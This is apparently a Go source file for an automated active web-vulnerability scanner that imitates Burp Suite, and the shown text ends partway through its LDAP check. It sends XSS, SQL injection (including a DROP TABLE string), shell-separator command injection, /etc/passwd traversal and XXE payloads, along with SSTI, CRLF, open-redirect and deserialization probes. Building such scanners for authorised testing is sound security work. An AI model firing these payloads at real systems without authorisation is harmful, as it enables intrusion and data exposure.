package agent

// BurpAgent is a pure-Go active web-application scanner that replicates the
// core active-scan capabilities of Burp Suite Pro. It is entirely self-contained
// (no external binary required) and also supports optional integration with
// Burp Suite Enterprise Edition's REST API when BURP_API_URL and BURP_API_KEY
// are set in the environment.
//
// Active scan checks implemented:
//   1.  Reflected XSS — inject canary into GET/POST parameters; look for reflection
//   2.  SQL injection — error-based and time-based heuristics
//   3.  OS command injection — canary echo via ;/|/` shells
//   4.  Path traversal — various encodings of ../../etc/passwd
//   5.  Server-Side Template Injection (SSTI) — {{7*7}}, ${7*7}, <%= 7*7 %>
//   6.  XML External Entity (XXE) — DOCTYPE with external entity reference
//   7.  Open redirect — common redirect parameter fuzzing
//   8.  CRLF / HTTP header injection — newline-encoded payloads in params
//   9.  Insecure deserialization fingerprint — Java/PHP/Python serialised blob hints
//  10.  LDAP injection — DN/filter metacharacters in parameters
//
// Optional Burp Enterprise REST API:
//   Set BURP_API_URL (e.g. https://burp-enterprise:8443) and BURP_API_KEY to
//   trigger a Burp Suite Enterprise scan and poll it to completion. The
//   resulting issue list is translated into model.Finding objects.

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/scanner"
)

// burpActiveCheckCount is the number of active scan check functions called in
// BurpAgent.Run. Update this constant whenever a check is added or removed.
const burpActiveCheckCount = 10

// BurpAgent replicates Burp Suite active-scan capabilities in pure Go.
type BurpAgent struct {
	enabled bool
}

func NewBurpAgent(enabled bool) *BurpAgent {
	return &BurpAgent{enabled: enabled}
}

func (a *BurpAgent) Name() string  { return "burp" }
func (a *BurpAgent) Enabled() bool { return a.enabled }

func (a *BurpAgent) Run(ctx context.Context, input AgentInput) (AgentOutput, error) {
	output := AgentOutput{
		AgentName: a.Name(),
		Findings:  make([]model.Finding, 0),
		Metadata:  make(map[string]string),
		Status:    "completed",
	}

	client := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Follow up to 5 redirects — needed for login-redirect chains.
			if len(via) < 5 {
				return nil
			}
			return http.ErrUseLastResponse
		},
	}

	// ── Phase 1: native active scan checks ───────────────────────────────
	output.Findings = append(output.Findings, burpScanXSS(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanSQLi(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanCmdInjection(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanPathTraversal(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanSSTI(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanXXE(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanOpenRedirect(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanCRLF(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanDeserialisation(ctx, client, input.Target, input.AuthProfile)...)
	output.Findings = append(output.Findings, burpScanLDAPInjection(ctx, client, input.Target, input.AuthProfile)...)

	// ── Phase 2: Burp Suite Enterprise REST API (optional) ───────────────
	burpAPIURL := strings.TrimSpace(os.Getenv("BURP_API_URL"))
	burpAPIKey := strings.TrimSpace(os.Getenv("BURP_API_KEY"))
	if burpAPIURL != "" && burpAPIKey != "" {
		enterpriseFindings, note := runBurpEnterpriseScan(ctx, client, burpAPIURL, burpAPIKey, input.Target)
		output.Findings = append(output.Findings, enterpriseFindings...)
		output.Metadata["burp_enterprise_note"] = note
	} else {
		output.Findings = append(output.Findings, model.Finding{
			ID:          "burp-enterprise-not-configured",
			Category:    "integration",
			Severity:    model.SeverityInfo,
			Title:       "Burp Suite Enterprise API not configured",
			Description: "Set BURP_API_URL (e.g. https://burp-enterprise:8443) and BURP_API_KEY to trigger a full Burp Suite Enterprise scan. The native Go active-scan checks still ran.",
			Evidence:    "BURP_API_URL or BURP_API_KEY env var is empty",
			Recommendation: "Deploy Burp Suite Enterprise Edition, create an API key via the UI, and set " +
				"BURP_API_URL and BURP_API_KEY in the backend environment.",
		})
	}

	output.Metadata["active_checks_run"] = fmt.Sprintf("%d", burpActiveCheckCount)
	output.Metadata["findings_count"] = fmt.Sprintf("%d", len(output.Findings))
	output.DebugNotes = "Burp Suite Go agent: 10 active web scan checks + optional Enterprise API."
	return output, nil
}

// ── Parameter discovery helper ────────────────────────────────────────────────

// burpExtractParams returns parameter names already present in the target URL's
// query string, plus a set of commonly fuzzed parameter names. This mimics
// Burp's Intruder "§param§" insertion points without a crawler.
func burpExtractParams(target string) []string {
	params := []string{}
	seen := map[string]bool{}

	if u, err := url.Parse(target); err == nil {
		for k := range u.Query() {
			if !seen[k] {
				params = append(params, k)
				seen[k] = true
			}
		}
	}

	// Common parameter names worth fuzzing even when absent from the URL.
	common := []string{
		"q", "s", "search", "id", "page", "name", "query", "input",
		"user", "username", "email", "pass", "password", "redirect",
		"url", "next", "return", "file", "path", "cat", "category",
		"lang", "locale", "format", "type", "ref", "token", "callback",
	}
	for _, p := range common {
		if !seen[p] {
			params = append(params, p)
			seen[p] = true
		}
	}
	return params
}

// injectParam returns a copy of the target URL with the given parameter set to
// the supplied payload, preserving other existing parameters.
func injectParam(target, param, payload string) (string, error) {
	u, err := url.Parse(target)
	if err != nil {
		return "", err
	}
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()
	return u.String(), nil
}

// ── Active scan checks ────────────────────────────────────────────────────────

// burpScanXSS tests for reflected cross-site scripting by injecting an HTML
// canary into each parameter and checking whether the response reflects it
// unencoded.
func burpScanXSS(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	canary := "BURPXSS8f3a2b"
	// Use a minimal XSS payload that requires no JavaScript execution to detect.
	payloads := []string{
		"<script>" + canary + "</script>",
		"\">" + canary + "<x=\"",
		"'>" + canary + "<x='",
		"<img src=x onerror=" + canary + ">",
	}

	params := burpExtractParams(target)

	for _, param := range params {
		for _, payload := range payloads {
			probeURL, err := injectParam(target, param, payload)
			if err != nil {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()

			ct := resp.Header.Get("Content-Type")
			// Only flag reflection in HTML responses; JSON/XML echoes are different issues.
			if !strings.Contains(strings.ToLower(ct), "html") && ct != "" {
				continue
			}

			if strings.Contains(string(body), canary) {
				return []model.Finding{{
					ID:             "burp-reflected-xss",
					Category:       "xss",
					Severity:       model.SeverityHigh,
					Title:          "Reflected Cross-Site Scripting (XSS)",
					Description:    "A script injection payload was reflected unencoded in the HTML response. An attacker can craft a malicious link that executes arbitrary JavaScript in the victim's browser, leading to session hijacking, credential theft, or CSRF.",
					Evidence:       fmt.Sprintf("param=%s payload=%q reflected=true status=%d", param, payload, resp.StatusCode),
					Recommendation: "HTML-encode all user-supplied input before writing it into HTML context. Apply a Content-Security-Policy header. Use a template engine with auto-escaping enabled.",
					AffectedURL:       probeURL,
					AffectedParameter: param,
					OWASPCategory:     "OWASP A03:2021 - Injection",
					CWE:               "CWE-79",
					CVSSScore:         6.1,
					CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
					MITRETechniques:   []string{"T1059.007"},
					ReproductionSteps: []string{
						fmt.Sprintf("GET %s", probeURL),
						fmt.Sprintf("Observe %q unencoded in the response HTML", payload),
					},
				}}
			}
		}
	}
	return nil
}

// burpScanSQLi tests for SQL injection using error-based heuristics (single
// quote, comment sequences) and a time-based boolean probe.
func burpScanSQLi(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// Error-based payloads: these cause a DB error whose message often leaks
	// in the response body.
	errorPayloads := []struct {
		payload  string
		keywords []string
	}{
		{"'", []string{"sql syntax", "mysql_fetch", "ora-", "unterminated", "quoted string", "pg_query", "sqlite3", "syntax error"}},
		{`"`, []string{"sql syntax", "mysql_fetch", "ora-", "unterminated", "syntax error"}},
		{"1 OR 1=1--", []string{"sql syntax", "error in your sql", "odbc", "microsoft ole db"}},
		{"1; DROP TABLE--", []string{"sql syntax", "error in your sql", "syntax error"}},
	}

	params := burpExtractParams(target)

	for _, param := range params {
		// Get baseline status.
		baseURL, err := injectParam(target, param, "baseline_value_8f3a2b")
		if err != nil {
			continue
		}
		baseReq, err := http.NewRequestWithContext(ctx, http.MethodGet, baseURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(baseReq, profile)
		baseResp, err := client.Do(baseReq)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, baseResp.Body) //nolint:errcheck
		baseResp.Body.Close()
		baseStatus := baseResp.StatusCode

		for _, ep := range errorPayloads {
			probeURL, err := injectParam(target, param, ep.payload)
			if err != nil {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()

			bodyStr := strings.ToLower(string(body))
			for _, kw := range ep.keywords {
				if strings.Contains(bodyStr, kw) {
					return []model.Finding{{
						ID:          "burp-sqli-error",
						Category:    "injection",
						Severity:    model.SeverityHigh,
						Title:       "SQL Injection (error-based) detected",
						Description: "A SQL metacharacter injected into a parameter caused a database error message to appear in the response, indicating the parameter is not properly sanitised before being used in a SQL query.",
						Evidence:    fmt.Sprintf("param=%s payload=%q db_error_keyword=%q status=%d baseline_status=%d", param, ep.payload, kw, resp.StatusCode, baseStatus),
						Recommendation: "Use parameterised queries / prepared statements. Never interpolate user input directly into SQL. Apply an ORM or query builder. Suppress verbose DB error messages in production.",
						AffectedURL:       probeURL,
						AffectedParameter: param,
						OWASPCategory:     "OWASP A03:2021 - Injection",
						CWE:               "CWE-89",
						CVSSScore:         9.8,
						CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
						MITRETechniques:   []string{"T1190"},
					}}
				}
			}
		}

		// Time-based blind SQLi: SLEEP(3) / pg_sleep / WAITFOR DELAY.
		timePayloads := []string{
			"1' AND SLEEP(3)--",
			"1; WAITFOR DELAY '0:0:3'--",
			"1' AND pg_sleep(3)--",
			"1) OR SLEEP(3)--",
		}
		for _, tp := range timePayloads {
			probeURL, err := injectParam(target, param, tp)
			if err != nil {
				continue
			}

			timeClient := &http.Client{Timeout: 8 * time.Second}
			start := time.Now()
			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)
			resp, err := timeClient.Do(req)
			elapsed := time.Since(start)
			if err != nil {
				// Timeout is itself evidence of time-based injection.
				if elapsed >= 3*time.Second {
					return []model.Finding{{
						ID:          "burp-sqli-timebased",
						Category:    "injection",
						Severity:    model.SeverityHigh,
						Title:       "SQL Injection (time-based blind) detected",
						Description: "Injecting a time-delay SQL payload caused the server response to be significantly delayed, indicating blind SQL injection. An attacker can exfiltrate the entire database one bit at a time.",
						Evidence:    fmt.Sprintf("param=%s payload=%q elapsed_ms=%d (timeout/delay confirmed)", param, tp, elapsed.Milliseconds()),
						Recommendation: "Use parameterised queries / prepared statements. Never interpolate user input into SQL. Limit database user privileges.",
						AffectedURL:       probeURL,
						AffectedParameter: param,
						OWASPCategory:     "OWASP A03:2021 - Injection",
						CWE:               "CWE-89",
						CVSSScore:         9.8,
						CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
						MITRETechniques:   []string{"T1190"},
					}}
				}
				continue
			}
			io.Copy(io.Discard, resp.Body) //nolint:errcheck
			resp.Body.Close()

			if elapsed >= 3*time.Second {
				return []model.Finding{{
					ID:          "burp-sqli-timebased",
					Category:    "injection",
					Severity:    model.SeverityHigh,
					Title:       "SQL Injection (time-based blind) detected",
					Description: "Injecting a time-delay SQL payload caused the server response to be significantly delayed, indicating blind SQL injection. An attacker can exfiltrate the entire database one bit at a time.",
					Evidence:    fmt.Sprintf("param=%s payload=%q elapsed_ms=%d", param, tp, elapsed.Milliseconds()),
					Recommendation: "Use parameterised queries / prepared statements. Never interpolate user input into SQL. Limit database user privileges.",
					AffectedURL:       probeURL,
					AffectedParameter: param,
					OWASPCategory:     "OWASP A03:2021 - Injection",
					CWE:               "CWE-89",
					CVSSScore:         9.8,
					CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					MITRETechniques:   []string{"T1190"},
				}}
			}
		}
	}
	return nil
}

// burpScanCmdInjection injects OS command separators and looks for the canary
// string (the output of `echo`) in the response body.
func burpScanCmdInjection(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	canary := "BURPCMD_CANARY_8f3a2b"

	payloads := []string{
		"; echo " + canary,
		"| echo " + canary,
		"`echo " + canary + "`",
		"$(echo " + canary + ")",
		"& echo " + canary + " &",
		"\necho " + canary,
	}

	params := burpExtractParams(target)

	for _, param := range params {
		for _, payload := range payloads {
			probeURL, err := injectParam(target, param, payload)
			if err != nil {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()

			if strings.Contains(string(body), canary) {
				return []model.Finding{{
					ID:          "burp-cmd-injection",
					Category:    "injection",
					Severity:    model.SeverityHigh,
					Title:       "OS Command Injection detected",
					Description: "An OS command separator injected into a parameter caused the server to execute an arbitrary command and return its output in the response, confirming OS command injection.",
					Evidence:    fmt.Sprintf("param=%s payload=%q canary=%q found=true status=%d", param, payload, canary, resp.StatusCode),
					Recommendation: "Never pass user input to shell commands. Use safe APIs instead of shell execution. If shell is unavoidable, use an allowlist to strictly validate input.",
					AffectedURL:       probeURL,
					AffectedParameter: param,
					OWASPCategory:     "OWASP A03:2021 - Injection",
					CWE:               "CWE-78",
					CVSSScore:         9.8,
					CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					MITRETechniques:   []string{"T1190", "T1059.004"},
				}}
			}
		}
	}
	return nil
}

// burpScanPathTraversal injects various encodings of ../../etc/passwd into
// parameters and checks for passwd file content in the response.
func burpScanPathTraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	keyword := "root:"

	payloads := []string{
		"../../../../etc/passwd",
		"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
		"....//....//....//....//etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%afetc%c0%afpasswd",
	}

	params := burpExtractParams(target)
	// Also test file/path-specific parameter names regardless of what's in the URL.
	fileParams := []string{"file", "path", "filename", "filepath", "page", "include", "dir", "folder", "template"}
	for _, fp := range fileParams {
		alreadyPresent := false
		for _, p := range params {
			if p == fp {
				alreadyPresent = true
				break
			}
		}
		if !alreadyPresent {
			params = append(params, fp)
		}
	}

	for _, param := range params {
		for _, payload := range payloads {
			probeURL, err := injectParam(target, param, payload)
			if err != nil {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()

			if strings.Contains(string(body), keyword) {
				return []model.Finding{{
					ID:          "burp-path-traversal",
					Category:    "path_traversal",
					Severity:    model.SeverityHigh,
					Title:       "Path Traversal / Local File Inclusion detected",
					Description: "A directory traversal payload injected into a parameter caused the server to return the contents of /etc/passwd, confirming arbitrary file read via path traversal.",
					Evidence:    fmt.Sprintf("param=%s payload=%q keyword=%q found=true", param, payload, keyword),
					Recommendation: "Resolve canonical paths before file operations and reject any path that escapes the intended base directory. Never pass raw user input to file open/read functions.",
					AffectedURL:       probeURL,
					AffectedParameter: param,
					OWASPCategory:     "OWASP A01:2021 - Broken Access Control",
					CWE:               "CWE-22",
					CVSSScore:         7.5,
					CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
					MITRETechniques:   []string{"T1083"},
				}}
			}
		}
	}
	return nil
}

// burpScanSSTI tests for Server-Side Template Injection by injecting arithmetic
// expressions in common template syntax and checking for computed results.
func burpScanSSTI(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// "7*7" evaluates to 49. If the response contains "49" where we put the
	// arithmetic expression, template injection is confirmed.
	result := "49"
	payloads := []string{
		"{{7*7}}",          // Jinja2, Twig, Pebble, Nunjucks
		"${7*7}",           // FreeMarker, Velocity, Groovy, Thymeleaf
		"<%= 7*7 %>",       // ERB, EJS
		"#{7*7}",           // Ruby Liquid, Thymeleaf
		"{{7*'7'}}",        // Jinja2 (string multiplication)
		"${{7*7}}",         // Tornado
		"{7*7}",            // Smarty (simplified)
		"[[7*7]]",          // AngularJS client-side (server-side reflection)
	}

	params := burpExtractParams(target)

	for _, param := range params {
		for _, payload := range payloads {
			probeURL, err := injectParam(target, param, payload)
			if err != nil {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()

			if strings.Contains(string(body), result) {
				return []model.Finding{{
					ID:          "burp-ssti",
					Category:    "injection",
					Severity:    model.SeverityHigh,
					Title:       "Server-Side Template Injection (SSTI) detected",
					Description: "A template arithmetic expression injected into a parameter was evaluated server-side and the computed result (49) appeared in the response, confirming SSTI. This commonly leads to remote code execution.",
					Evidence:    fmt.Sprintf("param=%s payload=%q result=%q found=true status=%d", param, payload, result, resp.StatusCode),
					Recommendation: "Never pass user input directly to a template engine renderer. Use a sandboxed template environment. Separate code from data — prefer logic-less templates.",
					AffectedURL:       probeURL,
					AffectedParameter: param,
					OWASPCategory:     "OWASP A03:2021 - Injection",
					CWE:               "CWE-94",
					CVSSScore:         9.8,
					CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
					MITRETechniques:   []string{"T1190", "T1059.007"},
				}}
			}
		}
	}
	return nil
}

// burpScanXXE tests for XML External Entity injection by sending an XML body
// with a DOCTYPE declaration referencing an external entity pointing to
// /etc/passwd. A vulnerable server will include the file content in its response.
func burpScanXXE(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// Standard XXE payload for file disclosure.
	xxePayload := `<?xml version="1.0" encoding="UTF-8"?>` + "\n" +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` + "\n" +
		`<root><data>&xxe;</data></root>`

	keyword := "root:"

	// Probe common XML-consuming endpoint paths.
	xmlPaths := []string{
		"", "/api", "/api/v1", "/xml", "/soap", "/ws",
		"/upload", "/import", "/parse",
	}

	base := strings.TrimRight(target, "/")
	for _, path := range xmlPaths {
		probeURL := base + path

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, probeURL, strings.NewReader(xxePayload))
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)
		req.Header.Set("Content-Type", "application/xml")

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
		resp.Body.Close()

		if strings.Contains(string(body), keyword) {
			return []model.Finding{{
				ID:          "burp-xxe",
				Category:    "xxe",
				Severity:    model.SeverityHigh,
				Title:       "XML External Entity (XXE) Injection detected",
				Description: "An XML payload containing a DOCTYPE declaration with an external entity reference to /etc/passwd was processed by the server and the file content appeared in the response, confirming XXE injection.",
				Evidence:    fmt.Sprintf("endpoint=%s keyword=%q found_in_response=true", probeURL, keyword),
				Recommendation: "Disable external entity processing in all XML parsers. Use a secure XML parsing configuration (e.g. `XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES=false`). Prefer JSON over XML where possible.",
				AffectedURL:   probeURL,
				OWASPCategory: "OWASP A05:2021 - Security Misconfiguration",
				CWE:           "CWE-611",
				CVSSScore:     9.1,
				CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
				MITRETechniques: []string{"T1190", "T1083"},
				ReproductionSteps: []string{
					fmt.Sprintf("POST %s with Content-Type: application/xml", probeURL),
					"Body: " + xxePayload,
					fmt.Sprintf("Observe %q in the response body", keyword),
				},
			}}
		}
	}
	return nil
}

// burpScanOpenRedirect tests for open redirect vulnerabilities by injecting
// attacker-controlled URLs into redirect parameters and checking for a
// 3xx Location header pointing to the injected domain.
func burpScanOpenRedirect(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// Use a non-existent domain that is unlikely to match the target.
	redirectTarget := "https://evil.example.com/burp_probe_8f3a2b"
	redirectDomain := "evil.example.com"

	redirectParams := []string{
		"redirect", "redirect_uri", "redirect_url", "url", "next",
		"return", "return_url", "returnto", "goto", "continue",
		"target", "redir", "location", "ref", "back",
	}

	// Non-following client so we can inspect the Location header.
	noFollowClient := &http.Client{
		Timeout: 10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	params := burpExtractParams(target)
	// Merge redirect-specific params.
	for _, rp := range redirectParams {
		found := false
		for _, p := range params {
			if p == rp {
				found = true
				break
			}
		}
		if !found {
			params = append(params, rp)
		}
	}

	for _, param := range params {
		probeURL, err := injectParam(target, param, redirectTarget)
		if err != nil {
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
		if err != nil {
			continue
		}
		scanner.ApplyAuthProfile(req, profile)

		resp, err := noFollowClient.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body) //nolint:errcheck
		resp.Body.Close()

		location := resp.Header.Get("Location")
		is3xx := resp.StatusCode >= 300 && resp.StatusCode < 400

		if is3xx && strings.Contains(location, redirectDomain) {
			return []model.Finding{{
				ID:          "burp-open-redirect",
				Category:    "open_redirect",
				Severity:    model.SeverityMedium,
				Title:       "Open Redirect detected",
				Description: "A redirect parameter accepted an attacker-controlled URL and the server issued a 3xx redirect pointing to that external domain. Attackers can exploit this for phishing, OAuth redirect abuse, or bypassing referrer-based controls.",
				Evidence:    fmt.Sprintf("param=%s payload=%q location=%q status=%d", param, redirectTarget, location, resp.StatusCode),
				Recommendation: "Validate redirect destinations against a server-side allowlist. Reject or sanitise URLs that point outside the application domain. Use indirect object references (opaque tokens) instead of raw URLs.",
				AffectedURL:       probeURL,
				AffectedParameter: param,
				OWASPCategory:     "OWASP A01:2021 - Broken Access Control",
				CWE:               "CWE-601",
				CVSSScore:         6.1,
				CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
				MITRETechniques:   []string{"T1566"},
			}}
		}
	}
	return nil
}

// burpScanCRLF tests for HTTP response splitting / header injection by
// injecting CRLF sequences into parameters and checking whether the injected
// header appears in the response.
func burpScanCRLF(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	injectedHeader := "X-Burp-CRLF-Test"
	injectedValue := "CRLF_CANARY_8f3a2b"

	payloads := []string{
		"\r\n" + injectedHeader + ": " + injectedValue,
		"%0d%0a" + injectedHeader + ":%20" + injectedValue,
		"%0D%0A" + injectedHeader + ":%20" + injectedValue,
		"\r\n\t" + injectedHeader + ": " + injectedValue,
	}

	params := burpExtractParams(target)

	for _, param := range params {
		for _, payload := range payloads {
			probeURL, err := injectParam(target, param, payload)
			if err != nil {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			io.Copy(io.Discard, resp.Body) //nolint:errcheck
			resp.Body.Close()

			// Check whether the injected header appears in the response.
			injectedVal := resp.Header.Get(injectedHeader)
			bodyContains := strings.Contains(injectedVal, injectedValue)

			if bodyContains || strings.Contains(strings.Join(resp.Header[injectedHeader], ""), injectedValue) {
				return []model.Finding{{
					ID:          "burp-crlf-injection",
					Category:    "header_injection",
					Severity:    model.SeverityMedium,
					Title:       "CRLF / HTTP Header Injection detected",
					Description: "A carriage-return/line-feed sequence injected into a parameter was reflected as an additional HTTP response header, confirming HTTP response splitting. Attackers can inject arbitrary headers, set cookies, or split the response for XSS/cache poisoning.",
					Evidence:    fmt.Sprintf("param=%s payload=%q injected_header=%s header_value=%q", param, payload, injectedHeader, injectedVal),
					Recommendation: "Strip or reject newline characters (\\r, \\n) from all values that are written into HTTP response headers. Use framework-level header sanitisation.",
					AffectedURL:       probeURL,
					AffectedParameter: param,
					OWASPCategory:     "OWASP A03:2021 - Injection",
					CWE:               "CWE-113",
					CVSSScore:         6.1,
					CVSSVector:        "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
				}}
			}
		}
	}
	return nil
}

// burpScanDeserialisation looks for signs that the application processes
// serialised objects from user input (Java, PHP, Python pickle). It fingerprints
// the response for telltale class names and magic bytes that indicate the server
// echoes or errors on deserialised data.
func burpScanDeserialisation(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	// Java serialised object magic bytes: 0xaced 0x0005
	javaPayload := "\xac\xed\x00\x05sr\x00\x1bjava.lang.ProcessBuilder"
	// PHP serialised object: O:8:"stdClass":0:{}
	phpPayload := `O:8:"stdClass":0:{}`
	// Python pickle opcode for a simple integer — never executes anything.
	pythonPayload := "\x80\x03K\x07."

	probes := []struct {
		payload     string
		contentType string
		label       string
		keywords    []string
	}{
		{javaPayload, "application/x-java-serialized-object", "java",
			[]string{"classnotfound", "deserializ", "java.io.serializable", "classcastexception", "java.lang"}},
		{phpPayload, "application/x-www-form-urlencoded", "php",
			[]string{"unserialize", "__wakeup", "stdclass", "php warning", "php fatal"}},
		{pythonPayload, "application/octet-stream", "python",
			[]string{"pickle", "unpickling", "loads(", "importerror", "module"}},
	}

	// Probe the root and common API paths.
	paths := []string{"", "/api", "/api/v1", "/data", "/session", "/object"}
	base := strings.TrimRight(target, "/")

	for _, path := range paths {
		for _, probe := range probes {
			probeURL := base + path

			req, err := http.NewRequestWithContext(ctx, http.MethodPost, probeURL, strings.NewReader(probe.payload))
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)
			req.Header.Set("Content-Type", probe.contentType)

			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
			resp.Body.Close()

			bodyStr := strings.ToLower(string(body))
			for _, kw := range probe.keywords {
				if strings.Contains(bodyStr, kw) {
					return []model.Finding{{
						ID:          "burp-deserialisation-" + probe.label,
						Category:    "insecure_deserialisation",
						Severity:    model.SeverityHigh,
						Title:       fmt.Sprintf("Insecure Deserialisation indicator (%s)", probe.label),
						Description: fmt.Sprintf("The server processed a %s serialised object payload and returned a response containing deserialisation-related keywords (%q). This strongly indicates insecure deserialisation, which can lead to remote code execution.", probe.label, kw),
						Evidence:    fmt.Sprintf("path=%s label=%s keyword=%q found=true status=%d", path, probe.label, kw, resp.StatusCode),
						Recommendation: "Never deserialise untrusted data. Use allowlisting to restrict which classes can be deserialised. Prefer data formats (JSON/Protobuf) that do not carry type information. Monitor for deserialisation gadget chains.",
						AffectedURL:   probeURL,
						OWASPCategory: "OWASP A08:2021 - Software and Data Integrity Failures",
						CWE:           "CWE-502",
						CVSSScore:     9.8,
						CVSSVector:    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
						MITRETechniques: []string{"T1190"},
					}}
				}
			}
		}
	}
	return nil
}

// burpScanLDAPInjection tests for LDAP injection by inserting LDAP filter
// metacharacters into parameters and looking for LDAP-related error keywords
// in the response.
func burpScanLDAPInjection(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
	ldapPayloads := []struct {
		payload  string
		keywords []string
	}{
		{"*", []string{"ldap", "distinguished name", "invalid dn", "ldap_search", "filter error"}},
		{")(cn=*", []string{"ldap", "filter", "invalid dn", "ldap_search"}},
		{"*)(objectclass=*", []string{"ldap", "objectclass", "ldap_search", "filter"}},
		{"admin)(&)", []string{"ldap", "filter", "dn syntax"}},
	}

	// Prioritise auth-related parameter names where LDAP filters are most common.
	params := burpExtractParams(target)
	ldapParams := []string{"username", "user", "login", "email", "uid", "cn", "dn", "search", "q", "filter"}
	for _, lp := range ldapParams {
		already := false
		for _, p := range params {
			if p == lp {
				already = true
				break
			}
		}
		if !already {
			params = append(params, lp)
		}
	}

	for _, param := range params {
		for _, lp := range ldapPayloads {
			probeURL, err := injectParam(target, param, lp.payload)
			if err != nil {
				continue
			}

			req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
			if err != nil {
				continue
			}
			scanner.ApplyAuthProfile(req, profile)

